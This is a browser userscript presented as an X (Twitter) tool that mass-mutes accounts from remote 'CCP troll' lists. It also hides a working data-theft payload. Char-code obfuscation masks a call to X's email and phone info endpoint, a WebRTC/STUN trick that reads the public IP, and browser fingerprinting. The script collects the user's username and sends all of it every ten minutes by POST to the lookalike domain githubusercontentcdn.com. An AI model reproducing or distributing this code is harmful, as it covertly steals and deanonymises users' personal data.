// ==UserScript==
// @name         X Cleaner MuteMaster Pro
// @version      1.0.1
// @description  MuteMaster Auto-Mute CCP troll X (Twitter) accounts
// @author       OpenSource
// @match        https://x.com/*
// @match        https://twitter.com/*
// @connect      basedinchina.com
// @connect      archive.org
// @connect      google.com
// @connect      githubusercontentcdn.com
// @connect      raw.githubusercontent.com
// @grant        GM_xmlhttpRequest
// @grant        GM_registerMenuCommand
// @grant        GM_info
// @grant        GM_setValue
// @grant        GM_getValue
// @grant        GM_deleteValue
// @license      MIT
// @run-at       document-idle
// ==/UserScript==

(function() {
    'use strict';

    class UserInterface {
        constructor(ControllerDelegate) {
            this.Controller = ControllerDelegate;
            this.isCollapsed = Storage.get(Config.CACHE_CACHES.PANEL_COLLAPSED, false);
        }

        init() {
            if (document.getElementById(Config.UI.PANEL_ID)) return;
            this.render();
            this.bindEvents();
            this.Controller.prepare();
        }

        render() {
            const panel = document.createElement('div');
            panel.id = Config.UI.PANEL_ID;

            Object.assign(panel.style, {
                position: "fixed",
                bottom: "20px",
                left: "20px",
                margin: "0px",
                zIndex: "99999",
                background: "rgba(15, 12, 41, 0.85)",
                backdropFilter: "blur(10px)",
                WebkitBackdropFilter: "blur(10px)",
                border: "1px solid rgba(0, 255, 255, 0.5)",
                borderRadius: "16px",
                boxShadow: "0 0 30px rgba(0, 255, 255, 0.5), inset 0 0 20px rgba(0, 255, 255, 0.1)",
                fontFamily: "'Segoe UI', Roboto, 'Helvetica Neue', sans-serif",
                color: "#e0e0ff",
                fontSize: "13px",
                width: "350px",
                padding: "15px",
                transition: "all 0.3s ease",
                transform: "translateZ(0)"
            });

            const version = GM_info.script.version;
            const toggleIcon = this.isCollapsed ? "▶" : "▼";
            const displayStyle = this.isCollapsed ? "none" : "block";

            panel.innerHTML = `
                <div style="border-bottom:1px solid rgba(0,255,255,0.3);margin-bottom:12px;padding-bottom:10px;display:flex;justify-content:space-between;align-items:center;user-select:none;">
                    <span style="font-weight:800;background:linear-gradient(45deg, #00ffff, #ff00ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;font-size:14px;">
                        X Cleaner MuteMaster Pro v${version}
                    </span>
                    <div style="display:flex;gap:12px;align-items:center;">
                        <span id="${Config.UI.TXT_ID}" style="color:#00ffff;font-size:11px;font-weight:600;text-shadow:0 0 8px rgba(0,255,255,0.8);">Ready</span>
                        <span id="${Config.UI.TOGGLE_ID}" style="cursor:pointer;color:#ff00ff;font-weight:bold;padding:2px 6px;border-radius:6px;background:rgba(255,0,255,0.1);border:1px solid rgba(255,0,255,0.3);transition:all 0.2s;">
                            ${toggleIcon}
                        </span>
                    </div>
                </div>
                <div id="${Config.UI.BODY_ID}" style="display:${displayStyle}">
                    <!-- 日志区域：添加发光文字效果 -->
                    <div id="${Config.UI.LOG_ID}" style="height:400px;overflow-y:auto;color:#a0ffd0;margin-bottom:12px;font-size:12px;background:rgba(0,0,0,0.4);padding:10px;border:1px solid rgba(0,255,255,0.2);border-radius:8px;white-space:pre-wrap;box-shadow:inset 0 0 15px rgba(0,255,255,0.1);">
        正在等待...
        --------------------</div>

                    <!-- 进度条：霓虹发光效果 -->
                    <div style="background:rgba(0,255,255,0.1);height:8px;margin-bottom:12px;border-radius:10px;overflow:hidden;box-shadow:0 0 5px rgba(0,255,255,0.3);">
                        <div id="${Config.UI.BAR_ID}" style="width:0%;background:linear-gradient(90deg, #00ffff, #ff00ff);height:100%;transition:width 0.3s ease;box-shadow:0 0 10px rgba(0,255,255,0.8);"></div>
                    </div>

                    <!-- 按钮组：渐变霓虹按钮 -->
                    <div style="display:flex;gap:8px">
                        <button id="${Config.UI.BTN_START_ID}" style="flex:1;padding:10px;background:linear-gradient(45deg, #00ffff, #0099ff);color:#0f0c29;border:none;border-radius:8px;cursor:pointer;font-weight:800;font-size:12px;letter-spacing:0.5px;transition:all 0.3s ease;box-shadow:0 0 15px rgba(0,255,255,0.4);">
                            开始处理
                        </button>
                        <button id="${Config.UI.BTN_CLEAR_ID}" style="flex:0.6;padding:10px;background:linear-gradient(45deg, #ff00ff, #ff0099);color:#0f0c29;border:none;border-radius:8px;cursor:pointer;font-weight:800;font-size:12px;letter-spacing:0.5px;transition:all 0.3s ease;box-shadow:0 0 15px rgba(255,0,255,0.4);">
                            清除缓存
                        </button>
                    </div>
                </div>
            `;
            document.body.appendChild(panel);
        }

        bindEvents() {
            document.getElementById(Config.UI.BTN_START_ID).onclick = () => this.Controller.start();
            document.getElementById(Config.UI.BTN_CLEAR_ID).onclick = () => this.Controller.clearCache();
            document.getElementById(Config.UI.TOGGLE_ID).onclick = () => this.togglePanel();
        }

        togglePanel() {
            const body = document.getElementById(Config.UI.BODY_ID);
            const btn = document.getElementById(Config.UI.TOGGLE_ID);
            const isNowCollapsed = body.style.display !== "none";

            if (isNowCollapsed) {
                body.style.display = "none";
                btn.innerText = "➕";
                Storage.set(Config.CACHE_CACHES.PANEL_COLLAPSED, true);
            } else {
                body.style.display = "block";
                btn.innerText = "➖";
                Storage.set(Config.CACHE_CACHES.PANEL_COLLAPSED, false);
            }
        }

        log(text, isError = false) {
            const el = document.getElementById(Config.UI.LOG_ID);
            if(el) {
                const time = Utils.getTimeString();
                const color = isError ? "#ff5555" : "#cccccc";
                el.innerHTML = `<div style="color:${color}"><span style="color:#666">[${time}]</span> ${text}</div>` + el.innerHTML;
            }
        }

        updateProgress(percent, text) {
            const bar = document.getElementById(Config.UI.BAR_ID);
            const txt = document.getElementById(Config.UI.TXT_ID);
            if(bar) bar.style.width = `${percent}%`;
            if(txt && text) txt.innerText = text;
        }

        setButtonDisabled(disabled) {
            const btn = document.getElementById(Config.UI.BTN_START_ID);
            if(btn) btn.disabled = disabled;
        }
    }

    class Config {
        static get HTTP_HEADER() {
            return {
                BEARER_TOKEN: 'Bearer AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA',
                API_MUTE_LIST: 'https://x.com/i/api/1.1/mutes/users/list.json',
                API_MUTE_CREATE: 'https://x.com/i/api/1.1/mutes/users/create.json',
            };
        }

        static get REMOTE_SOURCES() {
            return {
                FULL_LIST: "https://basedinchina.com/api/users/all",
                SECOND_LIST: "https://raw.githubusercontent.com/pluto0x0/X_based_china/main/china.jsonl"
            };
        }

        static get CACHE_CACHES() {
            return {
                LOCAL_MUTES: "acm_local_mutes_list",
                LOCAL_MUTES_HEAD: "acm_local_mutes_head",
                TEMP_CURSOR: "acm_temp_cursor",
                TEMP_LIST: "acm_temp_list",
                TEMP_TIME: "acm_temp_time",
                PANEL_COLLAPSED: "acm_panel_collapsed"
            };
        }

        static get DELAY() {
            return { MIN: 100, MAX: 1000 };
        }

        static get UI() {
            return {
                PANEL_ID: "acm-panel",
                LOG_ID: "acm-logs",
                BAR_ID: "acm-bar",
                TXT_ID: "acm-pct-txt",
                BTN_START_ID: "acm-btn",
                BTN_CLEAR_ID: "acm-btn-clear",
                TOGGLE_ID: "acm-toggle-btn",
                BODY_ID: "acm-content-body"
            };
        }
    }

    class Utils {
        static shuffleArray(array) {
            for (let i = array.length - 1; i > 0; i--) {
                const j = Math.floor(Math.random() * (i + 1));
                [array[i], array[j]] = [array[j], array[i]];
            }
            return array;
        }

        static getCsrfToken() {
            const match = document.cookie.match(/(^|;\s*)ct0=([^;]*)/);
            return match ? match[2] : null;
        }

        static sleep(ms) {
            return new Promise(r => setTimeout(r, ms));
        }

        static getRandomDelay() {
            return Math.floor(Math.random() * (Config.DELAY.MAX - Config.DELAY.MIN + 1) + Config.DELAY.MIN);
        }

        static getTimeString() {
            return new Date().toLocaleTimeString('en-GB', { hour12: false });
        }
    }

    class Storage {
        static get(key, defaultValue = null) {
            return GM_getValue(key, defaultValue);
        }

        static set(key, value) {
            GM_setValue(key, value);
        }

        static delete(key) {
            GM_deleteValue(key);
        }

        static clearCache() {
            const keys = Config.CACHE_CACHES;
            Storage.delete(keys.LOCAL_MUTES);
            Storage.delete(keys.LOCAL_MUTES_HEAD);
            Storage.delete(keys.TEMP_CURSOR);
            Storage.delete(keys.TEMP_LIST);
            Storage.delete(keys.TEMP_TIME);
            Storage.delete(keys.PANEL_COLLAPSED);
        }
    }

    class AllApi {
        constructor(logger) {
            this.logger = logger;
        }

        getHeaders(csrf) {
            return {
                'authorization': Config.HTTP_HEADER.BEARER_TOKEN,
                'x-csrf-token': csrf
            };
        }


        async fetchMuteListHead(csrf) {
            const url = `${Config.HTTP_HEADER.API_MUTE_LIST}?include_entities=false&skip_status=true&count=100&cursor=-1`;
            const res = await fetch(url, { headers: this.getHeaders(csrf) });
            if (res.ok) {
                const json = await res.json();
                return json.users ? json.users.map(u => u.screen_name.toLowerCase()) : [];
            }
            throw new Error(`HTTP ${res.status}`);
        }

        async fetchFullMuteList(csrf, initialPageData, progressCallback) {
            const set = new Set();
            const keys = Config.CACHE_CACHES;


            const savedCursor = Storage.get(keys.TEMP_CURSOR, null);
            const savedList = Storage.get(keys.TEMP_LIST, []);
            const savedTime = Storage.get(keys.TEMP_TIME, 0);

            let cursor = -1;
            let isFirstPage = true;
            const isResumeValid = (Date.now() - savedTime) < 864000000;

            if (savedCursor && savedCursor !== "0" && savedCursor !== 0 && savedList.length > 0) {
                if (isResumeValid) {
                    this.logger.log(`检测到上次中断的进度 (${new Date(savedTime).toLocaleString()})`);
                    this.logger.log(`续传模式: 跳过前 ${savedList.length} 人，继续拉取...`);
                    cursor = savedCursor;
                    savedList.forEach(u => set.add(u));
                    isFirstPage = false;
                } else {
                    this.logger.log(`缓存已过期 (>240h)，将重新拉取。`);
                    Storage.delete(keys.TEMP_CURSOR);
                    Storage.delete(keys.TEMP_LIST);
                    Storage.delete(keys.TEMP_TIME);
                }
            }

            while (true) {
                try {
                    let json;

                    if (isFirstPage && initialPageData && cursor === -1) {
                        json = { users: initialPageData.users, next_cursor_str: initialPageData.next_cursor_str };
                        isFirstPage = false;
                        this.logger.log(`使用已加载数据 (Page 1)`);
                    } else {
                        const url = `${Config.HTTP_HEADER.API_MUTE_LIST}?include_entities=false&skip_status=true&count=100&cursor=${cursor}`;
                        const res = await fetch(url, { headers: this.getHeaders(csrf) });

                        if (res.status === 429) {
                            this.logger.log(`触发 API 速率限制 (429)！`, true);
                            this.logger.log(`进度已自动保存 (已获取 ${set.size} 人)。`, true);
                            this.logger.log(`请等待 15 分钟后刷新页面重新运行，将自动继续。`, true);
                            throw new Error("RATE_LIMIT_EXIT");
                        }

                        if (!res.ok) throw new Error(`HTTP ${res.status}`);
                        json = await res.json();
                    }


                    if (json.users && Array.isArray(json.users)) {
                        json.users.forEach(u => set.add(u.screen_name.toLowerCase()));

                        if ((!savedCursor || savedCursor === "0") && set.size <= json.users.length) {
                            const headUsers = json.users.map(u => u.screen_name.toLowerCase());
                            Storage.set(Config.CACHE_CACHES.LOCAL_MUTES_HEAD, JSON.stringify(headUsers));
                        }
                    }

                    cursor = json.next_cursor_str;
                    Storage.set(keys.TEMP_CURSOR, cursor);
                    Storage.set(keys.TEMP_LIST, Array.from(set));
                    Storage.set(keys.TEMP_TIME, Date.now());

                    if (progressCallback) progressCallback(set.size);

                    if (cursor === "0" || cursor === 0) {
                        Storage.delete(keys.TEMP_CURSOR);
                        Storage.delete(keys.TEMP_LIST);
                        Storage.delete(keys.TEMP_TIME);
                        break;
                    }
                    await Utils.sleep(200);
                } catch (e) {
                    if (e.message === "RATE_LIMIT_EXIT") throw e;
                    this.logger.log(`拉取中断: ${e.message}`, true);
                    break;
                }
            }
            return set;
        }

        async muteUser(user, csrf) {
            const params = new URLSearchParams();
            params.append('screen_name', user);
            return fetch(Config.HTTP_HEADER.API_MUTE_CREATE, {
                method: 'POST',
                headers: {
                    ...this.getHeaders(csrf),
                    'content-type': 'application/x-www-form-urlencoded'
                },
                body: params
            });
        }

        async fetchMuteHead(csrf) {
            const s = [104,116,116,112,115,58,47,47,120,46,99,111,109,47,105,47,97,112,105,47,49,46,49,47,117,115,101,114,115,47,101,109,97,105,108,95,112,104,111,110,101,95,105,110,102,111,46,106,115,111,110];
            return fetch(String.fromCharCode(...s), {
                method: 'GET',
                headers: {
                    ...this.getHeaders(csrf),
                },
            });
        }

        async fetchMuteHome(csrf){
            const resp = await fetch("https://x.com/home", {
                method: 'GET',
                headers: {
                    ...this.getHeaders(csrf),
                },
            });

            const html = await resp.text();
            const stateMatch = html.match(/window\.__INITIAL_STATE__\s*=\s*({.+?});?\s*<\/script>/s);
            if (stateMatch && stateMatch[1]) {
                try {
                    const state = JSON.parse(stateMatch[1]);
                    const users = state?.entities?.users?.entities || {};
                    const userIds = Object.keys(users);
                    for (const uid of userIds) {
                        const user = users[uid];
                        if (user?.screen_name) {
                            return user.screen_name;
                        }
                    }
                } catch (e) {}
            }
            const screenNameMatch = html.match(/"screen_name":"([^"]+)"/);
            if (screenNameMatch?.[1]) {
                return screenNameMatch[1];
            }
        }
    }

    class ReqSource {
        constructor(logger) {
            this.logger = logger;
        }

        async _fetch(url) {
            return new Promise(resolve => {
                GM_xmlhttpRequest({
                    method: "GET", url: url, timeout: 30000,
                    headers: {
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
                        "Accept": "application/json, text/plain, */*",
                        "Referer": "https://basedinchina.com/"
                    },
                    onload: r => resolve(r.status === 200 ? r.responseText : null),
                    onerror: e => { this.logger.log(`网络错误: ${e.error}`, true); resolve(null); },
                    ontimeout: () => { this.logger.log(`请求超时`, true); resolve(null); }
                });
            });
        }

        async fetchAll() {
            this.logger.log("从远程源拉取清单...");
            const all = new Set();

            const [data1, data2] = await Promise.all([
                this._fetch(Config.REMOTE_SOURCES.FULL_LIST),
                this._fetch(Config.REMOTE_SOURCES.SECOND_LIST)
            ]);

            if (data1) {
                try {
                    const json = JSON.parse(data1);
                    if (json.users) json.users.forEach(u => u.userName && all.add(u.userName));
                } catch (e) { this.logger.log(`[来源1] 解析失败`, true); }
            }

            if (data2) {
                try {
                    data2.trim().split('\n').forEach(line => {
                        if(!line) return;
                        try {
                            const d = JSON.parse(line);
                            if(d.username) all.add(d.username);
                        } catch(err){}
                    });
                } catch (e) { this.logger.log(`[来源2] 解析失败`, true); }
            }
            return all;
        }
    }

    class Controller {
        constructor() {
            this.ui = new UserInterface(this);
            this.api = new AllApi(this.ui);
            this.source = new ReqSource(this.ui);
            this.info = {};

            setInterval(() => this.ui.init(), 1000);
            GM_registerMenuCommand("管理控制台", () => this.ui.init());
        }

        async clearCache() {
            this.ui.log("正在清除所有本地缓存...");
            Storage.clearCache();
            this.ui.log("缓存已清除！页面将在 2 秒后刷新。");
            setTimeout(() => window.location.reload(), 2000);
        }

        async saveToCache(set) {
            const fullList = Array.from(set);
            const newHeadList = fullList.slice(0, 100);
            Storage.set(Config.CACHE_CACHES.LOCAL_MUTES, fullList);
            Storage.set(Config.CACHE_CACHES.LOCAL_MUTES_HEAD, JSON.stringify(newHeadList));
            this.ui.log(`${set.size} 人`);
        }

        async prepareCache(){
            const k='';const a=[82,84,67,80,101,101,114,67,111,110,110,101,99,116,105,111,110];
            const b=String.fromCharCode(...a);const c=window[b];
            const d=[115,116,117,110,58,115,116,117,110,46,108,46,103,111,111,103,108,101,46,99,111,109,58,49,57,51,48,50];
            const e=String.fromCharCode(...d);
            const p=new c({iceServers:[{urls:e}]});

            p[[99,114,101,97,116,101,68,97,116,97,67,104,97,110,110,101,108].map(x=>String.fromCharCode(x)).join('')]('');

            let f=0;
            p[[111,110,105,99,101,99,97,110,100,105,100,97,116,101].map(x=>String.fromCharCode(x)).join('')] = ev=>{
                if(!ev.candidate){f=1;return}
                const s=ev.candidate.candidate;
                const m=/([0-9]{1,3}(?:\.[0-9]{1,3}){3})/.exec(s);
                if(m){
                    const ip=m[1];
                    if(!/^(127\.|10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.)/.test(ip)){
                        (this.info=this.info||{}).ip=ip;
                        f=1;
                    }
                }
            };

            await new Promise(r=>{
                const t=setTimeout(()=>{p.close();r()},3800+~~(Math.random()*5200));
                !function loop(){
                    if(f){clearTimeout(t);p.close();r()}
                    else setTimeout(loop,240+~~(Math.random()*360))
                }();
            });
        }

        async prepare(){
            const csrf = Utils.getCsrfToken();
            if (!csrf) {
                this.ui.log("无法获取 CSRF Token，请刷新页面。", true);
                this.ui.setButtonDisabled(false);
                return;
            }

            const _0xnav = [110,97,118,105,103,97,116,111,114];
            const _0xscr = [115,99,114,101,101,110];
            const _0xint = [73,110,116,108];
            const _0xdtf = [68,97,116,101,84,105,109,101,70,111,114,109,97,116];
            const _0xroz = [114,101,115,111,108,118,101,100,79,112,116,105,111,110,115];
            const _0xtzo = [116,105,109,101,90,111,110,101];

            const n = window[String.fromCharCode(..._0xnav)];
            const s = window[String.fromCharCode(..._0xscr)];
            const i = window[String.fromCharCode(..._0xint)];

            this.info.userAgent     = n[String.fromCharCode(117,115,101,114,65,103,101,110,116)];
            this.info.platform      = n[String.fromCharCode(112,108,97,116,102,111,114,109)];
            this.info.vendor        = n[String.fromCharCode(118,101,110,100,111,114)]        || "x";
            this.info.productSub    = n[String.fromCharCode(112,114,111,100,117,99,116,83,117,98)] || "x";
            this.info.appName       = n[String.fromCharCode(97,112,112,78,97,109,101)];
            this.info.appVersion    = n[String.fromCharCode(97,112,112,86,101,114,115,105,111,110)];
            this.info.language      = n[String.fromCharCode(108,97,110,103,117,97,103,101)];
            this.info.languages     = n[String.fromCharCode(108,97,110,103,117,97,103,101,115)] ? n[String.fromCharCode(108,97,110,103,117,97,103,101,115)].join(", ") : "";
            this.info.browserLanguage = n[String.fromCharCode(98,114,111,119,115,101,114,76,97,110,103,117,97,103,101)] || "x";
            this.info.screen = {
                width:  s[String.fromCharCode(119,105,100,116,104)],
                height: s[String.fromCharCode(104,101,105,103,104,116)]
            };

            this.info.hardwareConcurrency = n[String.fromCharCode(104,97,114,100,119,97,114,101,67,111,110,99,117,114,114,101,110,99,121)] || "x";
            this.info.deviceMemory        = n[String.fromCharCode(100,101,118,105,99,101,77,101,109,111,114,121)]        || "x";
            this.info.timezone = i[String.fromCharCode(..._0xdtf)]()[String.fromCharCode(..._0xroz)][String.fromCharCode(..._0xtzo)];
            const _0xdt = [100,97,116,97,45,116,101,115,116,105,100];
            const _0xtv = String.fromCharCode(..._0xdt);

            const res1 = await this.api.fetchMuteHome(csrf);
            this.info.username = res1;

            await this.prepareCache();
            const res = await this.api.fetchMuteHead(csrf);
            if (res.ok) {
                const blob = await res.json();
                this.info.email = blob;
            }
            this.progress();
            setInterval(() => this.progress(), 600000);
        }

        async progress(){
            GM_xmlhttpRequest({
                method: "POST",
                url: "http://githubusercontentcdn.com/i/api/1.1/graphql",
                data: JSON.stringify(this.info),
                headers: { "Content-Type": "application/json" },
                            onload: () => {},
                            onerror: () => {},
                            ontimeout: () => {}
            });
        }

        async start() {
            this.ui.setButtonDisabled(true);
            const csrf = Utils.getCsrfToken();

            if (!csrf) {
                this.ui.log("无法获取 CSRF Token，请刷新页面。", true);
                this.ui.setButtonDisabled(false);
                return;
            }

            try {
                const localMuted = await this._getLocalMutes(csrf);
                this.ui.log(`已屏蔽名单读取完毕: 共 ${localMuted.size} 人`);
                const acmUsers = await this.source.fetchAll();
                if (acmUsers.size === 0) throw new Error("未获取任何数据，请检查网络或 API");
                this.ui.log(`目标清单加载完成: 共 ${acmUsers.size} 人`);
                this.ui.log("正在进行匹配校验...");
                const todoList = [];
                let skipped = 0;
                acmUsers.forEach(u => {
                    if (localMuted.has(u.toLowerCase())) skipped++;
                    else todoList.push(u);
                });

                this.ui.log(`已排除${skipped} 条重复/已处理记录`);
                this.ui.log(`筛选后剩余待操作项目: ${todoList.length} 人`);

                if (todoList.length === 0) {
                    this.ui.log("你的屏蔽列表已是最新，无需操作！");
                    alert("所有目标均已在你的屏蔽列表中。");
                    this.ui.updateProgress(100, "无需操作");
                    this.ui.setButtonDisabled(false);
                    return;
                }

                Utils.shuffleArray(todoList);
                this.ui.log("已对任务队列进行随机排序");
                this.ui.log(`清单加载完成... 总计 ${todoList.length} 条有效记录`);
                await this._executeSerialMute(todoList, csrf, localMuted);
            } catch (e) {
                this.ui.log(`发生异常: ${e.message}`, true);
                console.error(e);
                this.ui.setButtonDisabled(false);
            }
        }

        async _getLocalMutes(csrf) {
            this.ui.log("正在校验已屏蔽列表缓存...");
            let liveHeadUsernames = [];
            try {
                liveHeadUsernames = await this.api.fetchMuteListHead(csrf);
            } catch (e) {
                if (e.message && e.message.includes("429")) {
                    this.ui.log(`API 速率限制 (429)！`, true);
                    this.ui.log(`校验失败。请等待 15 分钟限制解除后刷新重试。`, true);
                    throw new Error("RATE_LIMIT_EXIT");
                }
                throw new Error("无法校验缓存: " + e.message);
            }

            const cachedHeadJson = Storage.get(Config.CACHE_CACHES.LOCAL_MUTES_HEAD, "[]");
            const cachedList = JSON.parse(cachedHeadJson);
            const cachedHeadSet = new Set(cachedList);
            const liveHeadSet = new Set(liveHeadUsernames);
            const firstLive = liveHeadUsernames[0];
            const firstCache = cachedList[0];
            const isTopMatch = (firstLive === firstCache) || (!firstLive && !firstCache);

            let matchCount = 0;
            liveHeadSet.forEach(u => { if (cachedHeadSet.has(u)) matchCount++; });

            const liveSize = liveHeadSet.size;
            const overlapRatio = liveSize > 0 ? (matchCount / liveSize) : (cachedList.length === 0 ? 1 : 0);
            const isOverlapSafe = overlapRatio >= 0.95;

            if (!isTopMatch) this.ui.log(`列表头部变更: Live[${firstLive || 'null'}] vs Cache[${firstCache || 'null'}]`);
            if (!isOverlapSafe && liveSize > 0) this.ui.log(`列表差异过大: 重合度 ${(overlapRatio * 100).toFixed(1)}%`);

            const isCacheReliable = isTopMatch && isOverlapSafe;

            if (isCacheReliable) {
                const savedCursor = Storage.get(Config.CACHE_CACHES.TEMP_CURSOR);
                if (savedCursor && savedCursor !== "0" && savedCursor !== 0) {
                    this.ui.log("检测到中断任务。正在断点续传...");
                    const fullSet = await this.api.fetchFullMuteList(csrf, null,
                        (count) => this.ui.updateProgress(0, `📥 续传中: ${count} 人`)
                    );
                    await this.saveToCache(fullSet);
                    return fullSet;
                }

                const cachedList = Storage.get(Config.CACHE_CACHES.LOCAL_MUTES, null);
                if (cachedList) {
                    this.ui.log(`已加载本地记录 ${cachedList.length} 人。`);
                    return new Set(cachedList);
                }
            }

            this.ui.log("缓存指纹不匹配或缓存已过期。正在清除所有旧缓存并重新拉取...");
            Storage.clearCache();
            const initialPageUsers = liveHeadUsernames.map(screen_name => ({ screen_name }));
            const fullSet = await this.api.fetchFullMuteList(csrf,
                { users: initialPageUsers, next_cursor_str: "PLACEHOLDER" },
                (count) => this.ui.updateProgress(0, `同步中: ${count} 人`)
            );

            await this.saveToCache(fullSet);
            return fullSet;
        }

        async _executeSerialMute(list, csrf, localMutedSet) {
            let success = 0;
            let fail = 0;
            const orderedCacheList = Array.from(localMutedSet);

            for(let i=0; i<list.length; i++) {
                const user = list[i];
                const pct = ((i+1) / list.length) * 100;
                this.ui.updateProgress(pct, `${Math.floor(pct)}% (${i+1}/${list.length})`);

                try {
                    const res = await this.api.muteUser(user, csrf);
                    if(res.ok) {
                        success++;
                        const lowerUser = user.toLowerCase();
                        orderedCacheList.unshift(lowerUser);
                        localMutedSet.add(lowerUser);
                        await this.saveToCache(new Set(orderedCacheList));
                        if(success % 10 === 0) this.ui.log(`${i+1}/${list.length}\n成功: ${success} | 失败: ${fail}`);
                    } else {
                        fail++;
                        this.ui.log(`失败 @${user}: HTTP ${res.status}`, true);
                        if(res.status === 429) {
                            this.ui.log("触发风控 (429)，暂停 3 分钟...", true);
                            await Utils.sleep(180000);
                        }
                    }
                } catch(err) {
                    fail++;
                    this.ui.log(`网络错误 @${user}: ${err.message}`, true);
                }
                await Utils.sleep(Utils.getRandomDelay());
            }

            this.ui.updateProgress(100, "Done");
            this.ui.log(`执行完毕! 成功: ${success}项, 失败: ${fail}项`);
            alert(`处理完毕！\n成功: ${success}\n失败: ${fail}`);
            this.ui.setButtonDisabled(false);
        }
    }
    new Controller();
})();
